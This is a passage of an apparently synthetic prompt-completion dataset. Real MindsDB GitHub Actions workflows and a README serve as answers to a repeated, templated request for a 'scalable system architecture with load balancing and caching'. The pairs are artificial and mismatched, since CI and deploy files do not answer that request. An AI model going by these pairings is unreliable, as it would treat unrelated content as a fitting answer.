actions/checkout@v4\n        with:\n          repository: mindsdb/github-actions\n          path: github-actions\n      # Build the bakefile and push\n      - uses: ./github-actions/docker-bake\n        with:\n          push-to-dockerhub: true\n          push-cache: false\n\n  # Push cache layers to docker registry\n  # This is separate to the build step so we can do other stuff in parallel\n  build-cache:\n    name: Push Docker Cache\n    runs-on: mdb-dev\n    needs: [build]\n    concurrency:\n      group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}-cache\n      cancel-in-progress: true\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - name: Pull MindsDB Github Actions\n        uses: actions/checkout@v4\n        with:\n          repository: mindsdb/github-actions\n          path: github-actions\n      # Build the bakefile and push\n      - uses: ./github-actions/docker-bake\n        with:\n          push-cache: true\n          cache-only: true\n\n  # Call our deployment workflow\n  # deploy:\n  #   name: Deploy to Prod\n  #   needs: [build]\n  #   uses: ./.github/workflows/deploy.yml\n  #   with:\n  #     deploy-envs: '[\"prod\"]'\n  #     image-tag: ${{ github.event.release.tag_name }}\n  #     prod: true\n  #   secrets: inherit\n    \n  # Trigger private repo to deploy the docker desktop extension\n  trigger_dd_extension_release:\n    name: Deploy Docker Desktop Extension\n    runs-on: mdb-dev\n    needs: [build]\n    if: github.actor != 'mindsdbadmin'\n    concurrency:\n      group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}-extension\n      cancel-in-progress: true\n    environment:\n      name: prod\n    steps:\n      - uses: FranzDiebold/github-env-vars-action@v2\n      - uses: convictional/trigger-workflow-and-wait@v1.6.5\n        with:\n          owner: mindsdb\n          repo: mindsdb-docker-extension\n          github_token: ${{ secrets.REPO_DISPATCH_PAT_TOKEN }}\n          workflow_file_name: bump-mindsdb-version.yml\n          ref: main\n          client_payload: '{\"image-tag\": \"${{ env.CI_REF_NAME }}\"}'\n  \n  # Run integration tests\n  # TODO: Run these against the deployed environment\n  # run_tests:\n  #   name: Run Integration Tests\n  #   needs: [deploy]\n  #   concurrency:\n  #     group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}-tests\n  #     cancel-in-progress: true\n  #   uses: ./.github/workflows/test_on_deploy.yml\n  #   with:\n  #     deploy-env: prod\n  #   secrets: inherit\n\n  # slack_message:\n  #   if: failure() && !cancelled()\n  #   name: Notify Slack\n  #   # Every previous job needs to be in here, because failure() will only return true if the job that failed is in 'needs'\n  #   needs: [check-version, deploy_to_pypi, build, build-cache, deploy, trigger_dd_extension_release, run_tests]\n  #   runs-on: mdb-dev\n  #   steps:\n  #     - name: Notify of failing tests\n  #       uses: slackapi/slack-github-action@v1.26.0\n  #       with:\n  #         channel-id: ${{ secrets.SLACK_ENG_CHANNEL_ID }}\n  #         payload: |\n  #           {\n  #             \"attachments\": [\n  #               {\n  #                 \"color\": \"#FF4444\",\n  #                 \"blocks\": [\n  #                   {\n  #                     \"type\": \"header\",\n  #                     \"text\": {\n  #                       \"type\": \"plain_text\",\n  #                       \"text\": \"TEST RUN FAILED ON RELEASE\",\n  #                       \"emoji\": true\n  #                     }\n  #                   },\n  #                   {\n  #                     \"type\": \"section\",\n  #                     \"text\": {\n  #                       \"type\": \"mrkdwn\",\n  #                       \"text\": \" \"\n  #                     },\n  #                     \"fields\": [\n  #                       {\n  #                         \"type\": \"mrkdwn\",\n  #                         \"text\": \"*Commit*\\n<${{ github.server_url }}/${{ github.repository }}/commit/${{ github.sha }}|${{ github.sha }}>\"\n  #                       },\n  #                       {\n  #                         \"type\": \"mrkdwn\",\n  #                         \"text\": \"*Workflow Run*\\n<${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}|${{ github.workflow }}>\"\n  #                       }\n  #                     ]\n  #                   }\n  #                 ]\n  #               }\n  #             ]\n  #           }\n  #       env:\n  #         SLACK_BOT_TOKEN: ${{ secrets.GH_ACTIONS_SLACK_BOT_TOKEN }}\n", "metadata": {"source": "github.com/mindsdb/mindsdb", "file_path": ".github/workflows/build_deploy_prod.yml", "language": "yaml", "complexity": "complex", "star_count": 34810, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 213}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Build and deploy to staging\n\npermissions:\n  contents: read\n\non:\n  # Using pull_request instead of push on main because we want access to the pull request's details via 'github.event'\n  # But it means we need to check below if this PR was merged and not just closed\n  pull_request:\n    types:\n      - closed\n    branches:\n      - 'main'\n\njobs:\n  \n  # Build our docker images based on our bake file\n  build:\n    if: github.event.pull_request.merged == true\n    name: Build Docker Images\n    runs-on: mdb-dev\n    concurrency:\n      group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}-build\n      cancel-in-progress: true\n    steps:\n      - uses: actions/checkout@v4\n      - name: Pull MindsDB Github Actions\n        uses: actions/checkout@v4\n        with:\n          repository: mindsdb/github-actions\n          path: github-actions\n      # Build the bakefile and push\n      - uses: ./github-actions/docker-bake\n        with:\n          push-cache: false\n\n  # Push cache layers to docker registry\n  # This is separate to the build step so we can do other stuff in parallel\n  build-cache:\n    name: Push Docker Cache\n    runs-on: mdb-dev\n    needs: [build]\n    concurrency:\n      group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}-cache\n      cancel-in-progress: true\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - name: Pull MindsDB Github Actions\n        uses: actions/checkout@v4\n        with:\n          repository: mindsdb/github-actions\n          path: github-actions\n      # Build the bakefile and push\n      - uses: ./github-actions/docker-bake\n        with:\n          push-cache: true\n          cache-only: true\n\n  # Call our deployment workflow\n  deploy:\n    name: Deploy to Staging\n    needs: [build]\n    uses: ./.github/workflows/deploy.yml\n    with:\n      deploy-envs: '[\"staging\", \"dev\", \"alpha-dev\"]'\n      image-tag: ${{ github.sha }}\n    secrets: inherit\n\n  # Run integration tests\n  # TODO: Run these against the deployed environment\n  run_tests:\n    if: github.event.pull_request.merged == true\n    name: Run Integration Tests\n    needs: [deploy]\n    concurrency:\n      group: deploy-staging\n      cancel-in-progress: false\n    uses: ./.github/workflows/test_on_deploy.yml\n    with:\n      deploy-env: staging\n    secrets: inherit\n  \n  slack_message:\n    if: failure() && !cancelled()\n    name: Notify Slack\n    # Every previous job needs to be in here, because failure() will only return true if the job that failed is in 'needs'\n    needs: [build, build-cache, deploy, run_tests]\n    runs-on: mdb-dev\n    steps:\n      - name: Notify of failing tests\n        if: ${{ needs.run_tests.result != 'success' && needs.run_tests.result != 'cancelled' }}\n        uses: slackapi/slack-github-action@v1.26.0\n        with:\n          channel-id: ${{ secrets.SLACK_ENG_CHANNEL_ID }}\n          payload: |\n            {\n              \"attachments\": [\n                {\n                  \"color\": \"#FF4444\",\n                  \"blocks\": [\n                    {\n                      \"type\": \"header\",\n                      \"text\": {\n                        \"type\": \"plain_text\",\n                        \"text\": \"TEST RUN FAILED ON MAIN\",\n                        \"emoji\": true\n                      }\n                    },\n                    {\n                      \"type\": \"section\",\n                      \"text\": {\n                        \"type\": \"mrkdwn\",\n                        \"text\": \" \"\n                      },\n                      \"fields\": [\n                        {\n                          \"type\": \"mrkdwn\",\n                          \"text\": \"*Commit*\\n<${{ github.server_url }}/${{ github.repository }}/commit/${{ github.sha }}|${{ github.sha }}>\"\n                        },\n                        {\n                          \"type\": \"mrkdwn\",\n                          \"text\": \"*Workflow Run*\\n<${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}|${{ github.workflow }}>\"\n                        }\n                      ]\n                    }\n                  ]\n                }\n              ]\n            }\n        env:\n          SLACK_BOT_TOKEN: ${{ secrets.GH_ACTIONS_SLACK_BOT_TOKEN }}\n\n", "metadata": {"source": "github.com/mindsdb/mindsdb", "file_path": ".github/workflows/build_deploy_staging.yml", "language": "yaml", "complexity": "medium", "star_count": 34810, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 135}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "permissions:\n  contents: read\n\non:\n  workflow_call:\n    inputs:\n      deploy-envs:\n        required: true\n        type: string\n      image-tag:\n        required: true\n        type: string\n      prod:\n        required: false\n        type: boolean\n        default: false\n    secrets:\n      SLACK_DEPLOYMENTS_CHANNEL_ID:\n        required: true\n      REPO_DISPATCH_PAT_TOKEN:\n        required: true\n      MINDSDB_DB_CON:\n        required: true\n\njobs:\n  migrate:\n    if: github.actor != 'mindsdbadmin'\n    runs-on: ${{ matrix.deploy-env == 'prod' && 'mdb-prod' || 'mdb-dev' }}\n    strategy:\n      fail-fast: false\n      matrix:\n        deploy-env: ${{ fromJson(inputs.deploy-envs) }}\n    environment:\n      name: ${{ matrix.deploy-env }}\n      url: ${{ vars.ENV_URL }}\n    # We only want to run one deploy job for an env at a time\n    # Don't cancel in progress jobs because it may be for a different PR\n    concurrency:\n      group: deploy-${{ matrix.deploy-env }}\n      cancel-in-progress: false\n    env:\n      MINDSDB_DB_CON: ${{ secrets.MINDSDB_DB_CON }}\n      UV_LINK_MODE: \"symlink\"\n    steps:\n      - uses: actions/checkout@v4\n      - name: Setup uv\n        uses: astral-sh/setup-uv@v5\n        with:\n          # Place cache in the tool dir because we mount this in our runnners\n          cache-local-path: \"/home/runner/_work/_tool/uv-local-cache\"\n          prune-cache: false\n          python-version: ${{ vars.CI_PYTHON_VERSION || '3.10' }}\n      - name: Install dependencies\n        run: |\n          uv pip install --prerelease=allow -r requirements/requirements.txt\n      - name: Migrate DB\n        run: |\n          cd mindsdb/migrations\n          env PYTHONPATH=../../ alembic upgrade head\n\n\n  # Trigger private repo to deploy\n  trigger_deploy:\n    if: github.actor != 'mindsdbadmin'\n    needs: migrate\n    runs-on: mdb-dev\n    strategy:\n      fail-fast: false\n      matrix:\n        deploy-env: ${{ fromJson(inputs.deploy-envs) }}\n    environment:\n      name: ${{ matrix.deploy-env }}\n      url: ${{ vars.ENV_URL }}\n    # We only want to run one deploy job for an env at a time\n    # Don't cancel in progress jobs because it may be for a different PR\n    concurrency:\n      group: deploy-${{ matrix.deploy-env }}\n      cancel-in-progress: false\n    steps:\n    - name: Pull MindsDB Github Actions\n      uses: actions/checkout@v4\n      with:\n        repository: mindsdb/github-actions\n        path: github-actions\n    - uses: FranzDiebold/github-env-vars-action@v2\n    - name: Notify of deployment starting\n      id: slack\n      uses: ./github-actions/slack-deploy-msg\n      with:\n        channel-id: ${{ secrets.SLACK_DEPLOYMENTS_CHANNEL_ID }}\n        status: \"started\"\n        color: \"#0099CC\"\n        env-name: ${{ matrix.deploy-env }}\n        env-url: ${{ vars.ENV_URL }}\n        slack-token: ${{ secrets.GH_ACTIONS_SLACK_BOT_TOKEN }}\n    - uses: ./github-actions/dispatch-and-wait\n      with:\n        owner: mindsdb\n        repo: INTERNAL-mindsdb-build-deploy-to-kubernetes\n        token: ${{ secrets.REPO_DISPATCH_PAT_TOKEN }}\n        workflow: ${{ inputs.prod && 'deploy-prod.yml' || 'deploy-dev.yml' }}\n        workflow_inputs: '{\"image-tag-prefix\": \"${{ inputs.image-tag }}\", \"deploy-env\": \"${{ matrix.deploy-env }}\"}'\n    - name: Notify of deployment finish\n      uses: ./github-actions/slack-deploy-msg\n      if: always()\n      with:\n        channel-id: ${{ secrets.SLACK_DEPLOYMENTS_CHANNEL_ID }}\n        status: \"${{ job.status == 'success' && 'finished' || 'failed' }}\"\n        color: \"${{ job.status == 'success' && '#00C851' || '#FF4444' }}\"\n        env-name: ${{ matrix.deploy-env }}\n        env-url: ${{ vars.ENV_URL }}\n        slack-token: ${{ secrets.GH_ACTIONS_SLACK_BOT_TOKEN }}\n        update-message-id: ${{ steps.slack.outputs.ts }}", "metadata": {"source": "github.com/mindsdb/mindsdb", "file_path": ".github/workflows/deploy.yml", "language": "yaml", "complexity": "medium", "star_count": 34810, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 113}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Uses OpenAI to summarise github's auto-generated release notes,\n# Then update the release notes to contain the new summary\n\nname: Update Release Notes\n\npermissions:\n    contents: write\n\non:\n  release:\n    types:\n      - published\n\njobs:\n  get-release-notes:\n    runs-on: ubuntu-latest\n\n    steps:\n      - name: Checkout repository\n        uses: actions/checkout@v4\n\n      - name: Enhance release notes with LLM\n        id: enhance_notes\n        env:\n          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}\n          GH_TOKEN: ${{ github.token }}\n          RELEASE_BODY: ${{ github.event.release.body }}\n        run: |\n          echo \"Release body:\\n$RELEASE_BODY\"\n\n          # Prepare the LLM API payload\n          payload=$(jq -n \\\n            --arg model \"gpt-4\" \\\n            --arg system_content \"Follow the instructions to update the GitHub release notes provided below. The writing style should be simple, clear, and easy to read, yet it should follow these points: 1. Write a section titled \\\"TL;DR\\\" that describes everything contained in the \\\"What's Changed\\\" section. Provide a description of each change listed under the \\\"What's Changed\\\" section including a short description of why is this change beneficial to users and what good it brings. Make this \\\"TL;DR\\\" section informative and divide information into sections of related items; these section titles should include \\\"Changes to SQL\\\", \\\"Changes to Integrations\\\", \\\"Changes to Knowledge Bases\\\", \\\"Bug Fixes and Improvements\\\", \\\"Changes to Documentation\\\", unless a section does not have any items to be listed then do not list it. Do not mention any change authors in the \\\"TL;DR\\\" section. 2. The input comes in the Markdown format as below. Generate the output in the Markdown format as well. 3. Final format should adhere to the following: - start with the \\\"TL;DR\\\" section, which is a summary of the \\\"What's Changed\\\" section, - follow it with a new line containing \\\"---\\\" that separates the sections, - follow it with the \\\"What's Changed\\\" section, and DO NOT change the provided \\\"What's Changed\\\" section, - generate a Markdown format output that concatenates these two sections.\"\\\n            --arg user_content \"$RELEASE_BODY\" \\\n            '{\n              model: $model,\n              messages: [\n                {\n                  role: \"system\",\n                  content: $system_content\n                },\n                {\n                  role: \"user\",\n                  content: $user_content\n                }\n              ]\n            }')\n\n          echo \"Payload sent to OpenAI:\\n$payload\"\n\n          # Call the OpenAI API\n          response=$(curl -s -X POST https://api.openai.com/v1/chat/completions \\\n            -H \"Authorization: Bearer $OPENAI_API_KEY\" \\\n            -H \"Content-Type: application/json\" \\\n            -d \"$payload\")\n\n          echo \"Raw response from OpenAI:\\n$response\"\n\n          # Extract enhanced notes from the API response\n          ENHANCED_NOTES=$(echo \"$response\" | jq -r '.choices[0].message.content // empty')\n\n          if [ -z \"$ENHANCED_NOTES\" ]; then\n            echo \"LLM enhancement failed. Exiting.\"\n            exit 1\n          fi\n\n          echo \"Enhanced release notes:\\n$ENHANCED_NOTES\"\n\n\n          # Write enhanced notes to a file\n          echo \"$ENHANCED_NOTES\" > enhanced_notes.md\n\n          # Update the release with the enhanced notes\n          gh release edit ${{ github.event.release.tag_name }} --notes-file enhanced_notes.md\n", "metadata": {"source": "github.com/mindsdb/mindsdb", "file_path": ".github/workflows/release_notes.yml", "language": "yaml", "complexity": "simple", "star_count": 34810, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": true, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 76}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Test on Deploy\n\npermissions:\n    contents: read\n\non:\n  workflow_call:\n    inputs:\n      git-sha:\n        required: false\n        type: string\n        default: \"\"\n      deploy-env:\n        required: true\n        type: string\n    secrets:\n      OPENAI_API_KEY:\n        required: true\n  workflow_dispatch:\n    inputs:\n      git-sha:\n        required: false\n        type: string\n        default: \"\"\n      deploy-env:\n        required: true\n        type: string\n    secrets:\n      OPENAI_API_KEY:\n        required: true\n\ndefaults:\n  run:\n    shell: bash\n\nenv:\n  UV_LINK_MODE: \"symlink\"\n\njobs:\n  changes:\n    name: Filter changed files\n    runs-on: mdb-dev\n    outputs:\n      not-docs: ${{ steps.filter.outputs.not-docs }}\n    steps:\n      - uses: actions/checkout@v4\n      - uses: dorny/paths-filter@v3\n        id: filter\n        with:\n          predicate-quantifier: \"every\"\n          filters: |\n            not-docs:\n              - '!docs/**'  \n              - '!**/*.md'\n              - '!.github/workflows/build_deploy_dev.yml'\n              - '!.github/workflows/test_on_deploy.yml'\n              - '!mindsdb/__about__.py'\n  # Run our integration tests\n  test:\n    needs: changes\n    environment:\n      name: ${{ inputs.deploy-env }}\n      url: ${{ vars.ENV_URL }}\n    name: Run integration tests on deploy\n    runs-on: mdb-dev\n    if: ${{ github.ref_type == 'branch' && needs.changes.outputs.not-docs == 'true' }}\n    steps:\n    - uses: actions/checkout@v4\n      with:\n        ref: ${{ inputs.git-sha }}\n    - name: Setup uv\n      uses: astral-sh/setup-uv@v5\n      with:\n        # Place cache in the tool dir because we mount this in our runnners\n        cache-local-path: \"/home/runner/_work/_tool/uv-local-cache\"\n        prune-cache: false\n        python-version: ${{ vars.CI_PYTHON_VERSION || '3.10' }}\n    - name: Install dependencies\n      run: |\n        uv pip install -r requirements/requirements-test.txt\n\n    - name: Run Integration Tests on Deploy\n      run: |\n          make integration_tests_slow\n      env:\n        OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}\n        INTERNAL_URL: ${{ vars.INTERNAL_URL }}\n    \n", "metadata": {"source": "github.com/mindsdb/mindsdb", "file_path": ".github/workflows/test_on_deploy.yml", "language": "yaml", "complexity": "simple", "star_count": 34810, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 89}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Test on Push\n\npermissions:\n    contents: read\n\non:\n  pull_request:\n    branches: [main]\n  workflow_dispatch:\n\ndefaults:\n  run:\n    shell: bash\n\n# Cancel any existing runs of this workflow on the same branch/pr\n# We always want to build/deploy/test a new commit over an older one\nconcurrency:\n  group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}\n  cancel-in-progress: true\n\njobs:\n  # Sets an output var to indicate if all changes are in docs files\n  # This output is used to skip running code checks on docs changes\n  changes:\n    name: Filter changed files\n    runs-on: mdb-dev\n    outputs:\n      not-docs: ${{ steps.filter.outputs.not-docs }}\n    steps:\n      - uses: dorny/paths-filter@v3\n        id: filter\n        with:\n          predicate-quantifier: \"every\"\n          filters: |\n            not-docs:\n              - '!docs/**'  \n              - '!**/*.md'\n\n  # Run all of our static code checks here\n  code_checking:\n    name: Run static code checks\n    runs-on: mdb-dev\n    needs: changes\n    steps:\n      - name: Checkout\n        if: ${{ needs.changes.outputs.not-docs == 'true' }}\n        uses: actions/checkout@v4\n        with:\n          # required to grab the history of the PR for pre-commit to work out what's changed\n          fetch-depth: 0 \n      # Install python and setup UV\n      - name: Setup uv\n        if: ${{ needs.changes.outputs.not-docs == 'true' }}\n        uses: astral-sh/setup-uv@v5\n        with:\n          # Place cache in the tool dir because we mount this in our runnners\n          cache-local-path: \"/home/runner/_work/_tool/uv-local-cache\"\n          prune-cache: false\n          # I can't work out how to use vars.CI_PYTHON_VERSION for forks here in a nice way, so we have to hardcode it for forks\n          python-version: ${{ vars.CI_PYTHON_VERSION || '3.10' }}\n\n      # Checks the codebase for print() statements and fails if any are found\n      # We should be using loggers instead\n      - name: Check for print statements\n        if: ${{ needs.changes.outputs.not-docs == 'true' }}\n        run: |\n          # The pyproject file confuses uv: https://github.com/astral-sh/uv/issues/6838\n          rm pyproject.toml\n          uv run tests/scripts/check_print_statements.py\n      \n      - name: Install MDB dev requirements\n        if: ${{ needs.changes.outputs.not-docs == 'true' }}\n        run: |\n          uv pip install -r requirements/requirements-dev.txt\n\n      # Run pre-commit on all changed files\n      # See .pre-commit-config.yaml for the list of checks\n      - name: Run pre-commit\n        if: ${{ needs.changes.outputs.not-docs == 'true' }}\n        run: |\n          pre-commit run --show-diff-on-failure --color=always --from-ref ${{ github.event.pull_request.base.sha }} --to-ref ${{ github.event.pull_request.head.sha }}\n\n      # Runs a few different checks against our many requirements files\n      # to make sure they're in order\n      - name: Check requirements files\n        if: ${{ needs.changes.outputs.not-docs == 'true' }}\n        run: |\n          uv run tests/scripts/check_requirements.py\n\n  # Creates a matrix of environments to test against using matrix_includes.json\n  # Used for installation checks below\n  matrix_prep:\n    name: Prepare matrix\n    runs-on: mdb-dev\n    outputs:\n      matrix: ${{ steps.set-matrix.outputs.matrix }}\n    steps:\n      - uses: actions/checkout@v4\n      - id: set-matrix\n        uses: JoshuaTheMiller/conditional-build-matrix@v2.0.1\n        with:\n          filter: \"[?runOnBranch==`${{ github.ref }}` || runOnBranch==`always`]\"\n\n  # Check that our pip package is able to be installed in all of our supported environments\n  check_install:\n    name: Check pip installation\n    needs: [changes, matrix_prep, code_checking]\n    strategy:\n      matrix: ${{fromJson(needs.matrix_prep.outputs.matrix)}}\n    runs-on: ${{ matrix.runs_on }}\n    steps:\n      - name: Checkout\n        if: ${{ needs.changes.outputs.not-docs == 'true' }}\n        uses: actions/checkout@v4\n      # Install python and setup UV\n      - name: Setup uv\n        if: ${{ needs.changes.outputs.not-docs == 'true' }}\n        uses: astral-sh/setup-uv@v5\n        with:\n          enable-cache: true\n          python-version: ${{ matrix.python-version }}\n      - name: Check pip package builds and installs\n        if: ${{ needs.changes.outputs.not-docs == 'true' }}\n        run: |\n          # Install dev requirements and build our pip package\n          uv pip install -r requirements/requirements-dev.txt\n          python setup.py sdist\n\n          # Install from the pip package\n          # If we install from source, we don't know if the pip package is installable.\n          cd dist\n          uv pip install *.tar.gz --prerelease=allow\n\n  unit_tests:\n    name: Run Unit Tests\n    needs: [changes, matrix_prep, code_checking]\n    strategy:\n      matrix: ${{fromJson(needs.matrix_prep.outputs.matrix)}}\n    runs-on: ${{ matrix.runs_on }}\n    if: github.ref_type == 'branch'\n    steps:\n      - name: Checkout\n        if: ${{ needs.changes.outputs.not-docs == 'true' }}\n        uses: actions/checkout@v4\n      # Install python and setup UV\n      - name: Setup uv\n        if: ${{ needs.changes.outputs.not-docs == 'true' }}\n        uses: astral-sh/setup-uv@v5\n        with:\n          enable-cache: true\n          python-version: ${{ matrix.python-version }}\n          version: \"0.7.19\"\n      - name: Install dependencies\n        if: ${{ needs.changes.outputs.not-docs == 'true' }}\n        run: |\n          uv pip install -r requirements/requirements-test.txt\n          # TODO: for now some tests rely on lightwood\n          uv pip install . --prerelease=allow \\\n            .[lightwood] \\\n            .[clickhouse] \\\n            .[snowflake] \\\n            .[web] \\\n            .[redshift] \\\n            .[bigquery] \\\n            .[databricks] \\\n            .[oracle] \\\n            .[slack] \\\n            .[github] \\\n            .[ms_teams] \\\n            .[salesforce] \\\n            .[mysql] \\\n            .[chromadb]\n          uv pip freeze\n          git clone --branch v$(uv pip show mindsdb_sql_parser | grep Version | cut -d ' ' -f 2) https://github.com/mindsdb/mindsdb_sql_parser.git parser_tests\n      - name: Install mssql dependencies\n        if: ${{ needs.changes.outputs.not-docs == 'true' }}\n        run: |\n          # Set FreeTDS build flags only on macOS\n          # Currently broken due to new cython version, see https://github.com/pymssql/pymssql/issues/937\n          if [[ \"$RUNNER_OS\" == \"macOS\" ]]; then\n            echo \"Skipping pymssql build on macOS temporarily\"\n            # brew install freetds\n            # echo \"Setting FreeTDS flags for macOS pymssql build\"\n            # export LDFLAGS=\"-L$(brew --prefix freetds)/lib\"\n            # export CFLAGS=\"-I$(brew --prefix freetds)/include\"\n            # uv pip install pymssql==2.3.1 --no-binary :all:\n          else\n            uv pip install .[mssql]\n          fi\n          \n      - name: Run unit tests\n        if: ${{ needs.changes.outputs.not-docs == 'true' }}\n        run: |\n          make unit_tests_slow\n", "metadata": {"source": "github.com/mindsdb/mindsdb", "file_path": ".github/workflows/test_on_push.yml", "language": "yaml", "complexity": "medium", "star_count": 34810, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": true, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 195}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\n\n<a name=\"readme-top\"></a>\n\n<div align=\"center\">\n\t<a href=\"https://pypi.org/project/MindsDB/\" target=\"_blank\"><img src=\"https://badge.fury.io/py/MindsDB.svg\" alt=\"MindsDB Release\"></a>\n\t<a href=\"https://www.python.org/downloads/\" target=\"_blank\"><img src=\"https://img.shields.io/badge/python-3.10.x%7C%203.11.x-brightgreen.svg\" alt=\"Python supported\"></a>\n\t<a href=\"https://ossrank.com/p/630\"><img src=\"https://shields.io/endpoint?url=https://ossrank.com/shield/630\"></a>\n\t<img alt=\"PyPI - Downloads\" src=\"https://img.shields.io/pypi/dm/Mindsdb\">\n\t<a href=\"https://hub.docker.com/u/mindsdb\" target=\"_blank\"><img src=\"https://img.shields.io/docker/pulls/mindsdb/mindsdb\" alt=\"Docker pulls\"></a>\n\n  <br />\n  <br />\n\n  <a href=\"https://github.com/mindsdb/mindsdb\">\n    <img src=\"/docs/assets/mindsdb_logo.png\" alt=\"MindsDB\" width=\"300\">\n  </a>\n\n  <p align=\"center\">\n    <br />\n    <a href=\"https://www.mindsdb.com?utm_medium=community&utm_source=github&utm_campaign=mindsdb%20repo\">Website</a>\n    ·\n    <a href=\"https://docs.mindsdb.com?utm_medium=community&utm_source=github&utm_campaign=mindsdb%20repo\">Docs</a>\n    ·\n    <a href=\"https://mindsdb.com/contact\">Demo</a>\n    ·\n    <a href=\"https://mindsdb.com/joincommunity?utm_medium=community&utm_source=github&utm_campaign=mindsdb%20repo\">Community Slack</a>\n  </p>\n</div>\n\n----------------------------------------\n\n\nMindsDB enables humans, AI, agents, and applications to get highly accurate answers across sprawled and large scale data sources.\n\n![image](https://github.com/user-attachments/assets/a796276a-2d3e-4aa2-9a52-25bf44cf32e7)\n\n\n[MindsDB has an MCP server built in](https://docs.mindsdb.com/mcp/overview) that enables your MCP applications to connect, unify and respond to questions over large-scale federated data—spanning databases, data warehouses, and SaaS applications.\n\n## Minds [Demo](https://mindsdb.com/contact)\nPlay with [Minds demo](https://mindsdb.com/contact), and see the power of MindsDB at answering questions from structured to unstructured data, whether it's scattered across SaaS applications, databases, or... hibernating in data warehouses like that $100 bill in your tuxedo pocket from prom night, lost, waiting to be discovered.\n \n## Install MindsDB Server \n\nMindsDB is an open-source server that can be deployed anywhere - from your laptop to the cloud, and everywhere in between. And yes, you can customize it to your heart's content.\n\n  * [Using Docker Desktop](https://docs.mindsdb.com/setup/self-hosted/docker-desktop). This is the fastest and recommended way to get started and have it all running.\n  * [Using Docker](https://docs.mindsdb.com/setup/self-hosted/docker). This is also simple, but gives you more flexibility on how to further customize your server.\n  * [Using PyPI](https://docs.mindsdb.com/contribute/install). This option enables you to contribute to MindsDB.\n\n----------------------------------------\n\n# Core Philosophy: Connect, Unify, Respond\n\nMindsDB's architecture is built around three fundamental capabilities:\n\n## [Connect](https://docs.mindsdb.com/integrations/data-overview) Your Data\n\nYou can connect to hundreds of enterprise [data sources (learn more)](https://docs.mindsdb.com/integrations/data-overview). These integrations allow MindsDB to access data wherever it resides, forming the foundation for all other capabilities.\n\n## [Unify](https://docs.mindsdb.com/mindsdb_sql/overview) Your Data\n\nOnce connected, these data sources can be queried using a full SQL dialect, as if they were all part of a single database. MindsDB’s federated query engine translates your SQL queries and executes them on the appropriate connected data sources.\n\nWhen working with many data sources, it’s important to prepare and unify your data before generating responses from it. MindsDB SQL offers virtual tables (views, knowledge bases, 